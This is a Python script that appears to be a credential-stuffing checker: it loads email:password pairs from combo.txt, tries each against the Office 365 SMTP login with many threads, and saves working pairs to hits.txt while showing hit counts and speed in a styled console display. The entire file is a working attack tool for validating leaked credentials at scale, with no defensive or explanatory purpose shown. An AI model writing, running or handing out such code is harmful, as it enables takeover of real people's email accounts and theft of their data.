import smtplib
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate
from colorama import Fore, init

init(autoreset=True)

# counter
hits = 0
bad = 0
errs = 0
checks = 0
lock = threading.Lock()
last_valid = "None"
total_combos = 0
start_time = time.time()

def check(email, pwd):
    global hits, bad, errs, checks, last_valid
    try:
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(email, pwd)

        with lock:
            hits += 1
            last_valid = f"{email}:{pwd}"
            with open('hits.txt', 'a') as f:
                f.write(f"{email}:{pwd}\n")
        server.quit()

    except smtplib.SMTPAuthenticationError:
        with lock:
            bad += 1
            with open('bad.txt', 'a') as f:
                f.write(f"{email}:{pwd}\n")

    except Exception as e:
        with lock:
            errs += 1
            with open('error.log', 'a') as f:
                f.write(f"Error: {str(e)} with {email}\n")

    with lock:
        checks += 1

def cpm_calc():
    while True:
        time.sleep(1)
        elapsed = time.time() - start_time
        with lock:
            cpm = (checks / elapsed) * 60
        ui(cpm)

def eta():
    elapsed = time.time() - start_time
    if checks > 0 and total_combos > 0:
        remaining = total_combos - checks
        cpm = (checks / elapsed) * 60
        if cpm > 0:
            eta_secs = remaining / (cpm / 60)
            return time.strftime("%H:%M:%S", time.gmtime(eta_secs))
    return "N/A"

def progress():
    pct = (checks / total_combos) * 100 if total_combos > 0 else 0
    bar_len = 40
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "-" * (bar_len - filled)
    return f"[{bar}] {pct:.2f}%"

def ui(cpm):
    print("\033[H\033[J", end="")

    art = """
                              __          __        _          __                  
                             / /_  ____  / /_  ___ ( )_____   / /_  ____ ___  _____
                            / __ \/ __ \/ __ \/ _ \|// ___/  / __ \/ __ `__ \/ ___/
                           / /_/ / /_/ / /_/ /  __/ (__  )  / / / / / / / / / /__  
                          /_.___/\____/_.___/\___/ /____/  /_/ /_/_/ /_/ /_/\___/  
    """
    print(Colorate.Horizontal(Colors.purple_to_red, art, 1))

    box_top = Colorate.Horizontal(Colors.yellow_to_red, "╭" + "─" * 102 + "╮", 1)
    box_bottom = Colorate.Horizontal(Colors.yellow_to_red, "╰" + "─" * 102 + "╯", 1)
    print(box_top)

    elapsed = time.time() - start_time
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(elapsed))

    print(f"│   {Fore.GREEN}[Hits: {hits}]".ljust(30) + f"{Fore.RED}[Bad: {bad}]".ljust(30) + f"{Fore.CYAN}[Errors: {errs}]".ljust(30) + "│")
    print(f"│   {Fore.MAGENTA}[CPM: {int(cpm)}]".ljust(30) + f"{Fore.YELLOW}[Elapsed: {elapsed_time}]".ljust(50) + "│")
    print("│" + " " * 102 + "│")
    print(f"│   {Fore.BLUE}Progress: {progress()}".ljust(107) + "│")
    print("│" + " " * 102 + "│")
    print(f"│   {Fore.GREEN}[Last Valid: {last_valid}]".ljust(107) + "│") # fucking bugged ui
    print(box_bottom)

def load(file, threads):
    global total_combos
    with open(file, 'r') as f:
        combos = [line.strip() for line in f if ':' in line]
    total_combos = len(combos)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for combo in combos:
            email, pwd = combo.split(":")
            executor.submit(check, email, pwd)

if __name__ == "__main__":
    threads = int(input("Enter number of threads: "))
    start_time = time.time()

    threading.Thread(target=cpm_calc, daemon=True).start()

    try:
        load('combo.txt', threads)
    except FileNotFoundError:
        print(f"{Fore.RED}combo.txt deleted")
        exit()

    ui(0)
